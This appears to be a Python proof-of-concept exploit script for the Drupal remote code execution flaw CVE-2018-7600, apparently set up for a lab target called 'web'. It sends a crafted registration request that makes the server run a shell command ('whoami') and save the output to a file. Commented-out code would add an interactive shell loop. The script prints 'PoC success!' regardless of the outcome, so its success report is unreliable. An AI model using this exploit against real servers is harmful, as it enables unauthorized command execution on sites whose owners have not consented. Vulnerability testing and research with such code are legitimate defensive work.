#!/usr/bin/python3
# coding:utf-8


import sys
import requests
import json
import time
import subprocess


url='http://web:80'
cmd="whoami"

proxies = {}
verify = True

def do_post(cmd):
    target = url + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' 
    payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': ''+cmd+' | tee exphub.txt'}
    r = requests.post(target, proxies=proxies, data=payload, verify=verify)
    command = r.json()[0]["data"]
    command = command.split("<span")[0]
    print (command)
    
# check = requests.get(url + '/exphub.txt', proxies=proxies, verify=verify)
# if check.status_code != 200:
#   sys.exit("[-] not cve-2018-7600\n")
# print ('[+] '+url+'/exphub.txt\n')

# while 1:
#     cmd = input("Shell >>> ")
#     if cmd == "exit" : exit(0)

#time.sleep(200)
result = do_post(cmd) 

# code=requests.get("http://web:80/exphub.txt").status_code
# if code== "200" : print("PoC success!")
print("PoC success!")
exit(0)
